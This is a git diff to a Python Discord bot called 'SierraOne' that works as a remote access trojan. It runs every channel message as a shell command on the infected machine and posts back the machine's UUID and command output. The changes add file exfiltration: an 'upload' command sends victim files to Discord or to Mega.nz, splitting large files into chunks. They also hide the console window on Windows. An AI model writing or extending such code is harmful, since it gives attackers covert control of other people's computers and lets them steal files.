@@ -1,14 +1,17 @@
+import config
 import discord
 from discord.ext import commands
+import io
+from mega import Mega
 import os
 import platform
 import subprocess
 import sys
-import yaml
 
 bot = commands.Bot(command_prefix=".")
 
 channel = None
+
 
 @bot.event
 async def on_ready():
@@ -36,6 +39,11 @@ async def on_ready():
     # Pin the machine info to 'sierra-hotel-'
     await send_info.pin()
 
+    if config.mega_email == "" and config.mega_password == "":
+        await channel.send("**WARNING**\nMega credentials were not found. All your uploads larger than 7.5 MB will be split into chunks and uploaded over Discord.")
+
+    else:
+        await channel.send("Mega credentials found. All your uploads larger than 7.5 MB will be uploaded to Mega.")
 
 # Create 'SierraOne' category
 async def create_category(guild):
@@ -80,9 +88,14 @@ async def next_channel(channels):
 # Get the machine info
 async def machine_info():
     if platform.system() == "Windows":
-        machine_UUID = str(subprocess.check_output("wmic csproduct get UUID"))
+        get_UUID = str(subprocess.check_output("wmic csproduct get UUID").decode().strip())
+        for line in get_UUID:
+            UUID = " ".join(get_UUID.split())
+            machine_UUID = UUID[5:]
+    
     elif platform.system() == "Linux":
         machine_UUID = str(subprocess.check_output(["cat", "/etc/machine-id"]).decode().strip())
+    
     elif platform.system() == "Darwin":
         machine_UUID = str(subprocess.check_output(["ioreg",
                                                     "-d2",
@@ -92,15 +105,16 @@ async def machine_info():
                                                     "awk",
                                                     "-F",
                                                     "'/IOPlatformUUID/{print $(NF-1)}'"
-                                                   ])
+                                                    ])
                            )
+    
     else:
         machine_UUID = str("Unknown")
 
     message = discord.Embed(title="Machine Info", type="rich")
     message.add_field(name="Operating System", value=platform.system())
     message.add_field(name="UUID", value=machine_UUID)
-    
+
     # Non-embed alternative
     # message = f"`{platform.system()}` with the `{machine_UUID}` UUID connected."
 
@@ -111,6 +125,7 @@ async def machine_info():
 async def on_message(message):
     if message.author.id == bot.user.id:
         return
+    
     else:
         await shell_input(channel, message)
 
@@ -121,9 +136,46 @@ async def shell_input(channel, message):
         # Check if the message content starts with "upload"
         if message.content.startswith("upload"):
             try:
-                # Upload the requested file
-                output = await message.channel.send(file=discord.File(message.content[7:]))
-            
+                # In reality it's 8 MB, but for the sake of having upload issues, it's been set to 7.5 MB
+                discord_limit = 7864320 
+                sierraone_limit = 33554432
+
+                name = message.content[7:].split(".")[0]
+                extension = message.content[7:].split(".")[1]
+
+                if os.path.getsize(message.content[7:]) <= discord_limit:
+                    await message.channel.send(f"Uploading `{message.content[7:]}`, standby...")
+                    await message.channel.send(file=discord.File(message.content[7:]))
+
+                elif discord_limit < os.path.getsize(message.content[7:]) <= sierraone_limit:
+                    # Check if Mega.nz credentials are present. If not, split the file into 7.5 MB chunks and upload them over Discord
+                    if config.mega_email != "" and config.mega_password != "":
+                        await message.channel.send(f"Uploading `{message.content[7:]}` to Mega, standby...")
+                        
+                        mega_file = mega_nz.upload(message.content[7:])
+                        mega_link = mega_nz.get_upload_link(mega_file)
+
+                        await message.channel.send(f"Your Mega link: {mega_link}")
+
+                    else:
+                        await message.channel.send("Splitting your file and uploading the parts, standby...")
+
+                        with open(message.content[7:], "rb") as file:
+                            chunk = file.read(7864320)
+
+                            i = 1
+                            while chunk:
+                                bytes = io.BytesIO(chunk)
+
+                                await message.channel.send(f"Uploading `{message.content[7:]}-{i}`, standby...`")
+                                await message.channel.send(file=discord.File(bytes, filename=f"{message.content[7:]}-{i}"))
+                                
+                                chunk = file.read(7864320)
+                                i += 1
+
+                else:
+                    await message.channel.send("File is too big (> 32 MB)")
+
             except FileNotFoundError:
                 # Notify the user if the requested file was not found
                 await message.channel.send("File not found")
@@ -147,30 +199,52 @@ async def shell_input(channel, message):
             try:
                 # Try to read the user's input
                 user_input = os.popen(message.content).read()
-            
+
             except:
                 print("OS POPEN exception!")
-            
+
             if user_input == "":
                 await message.channel.send("The command did not return anything")
+            
             else:
-                await message.channel.send(f"```{user_input}```")
-    
+                paginator = discord.ext.commands.Paginator(prefix="```", suffix="```")
+
+                n = 1992
+                user_input_splitted = [user_input[i:i + n] for i in range(0, len(user_input), n)]
+
+                for page in user_input_splitted:
+                    paginator.add_line(page)
+
+                for page in paginator.pages:
+                    await message.channel.send(f"{page}")
+
     else:
         return
 
 
-# Open 'config.yaml'
-with open("config.yaml") as file:
-    settings = yaml.load(file, Loader=yaml.FullLoader)
+if platform.system() == "Windows":
+    import ctypes
+    import pywintypes
+    import win32process
 
-    # Server ID
-    server_id = settings["server_id"]
+    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
+    if hwnd != 0:
+        ctypes.windll.user32.ShowWindow(hwnd, 0)
+        ctypes.windll.kernel32.CloseHandle(hwnd)
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        os.system(f"taskkill /PID {pid} /f")
 
-    # Category prefix
-    category_prefix = settings["category_prefix"]
+# Server ID
+server_id = config.server_id
 
-    # Channel prefix
-    channel_prefix = settings["channel_prefix"]
+# Category prefix
+category_prefix = config.category_prefix
 
-    bot.run(settings["bot_token"])
+# Channel prefix
+channel_prefix = config.channel_prefix
+
+if config.mega_email != "" and config.mega_password != "":
+    mega = Mega()
+    mega_nz = mega.login(config.mega_email, config.mega_password)
+
+bot.run(config.bot_token)
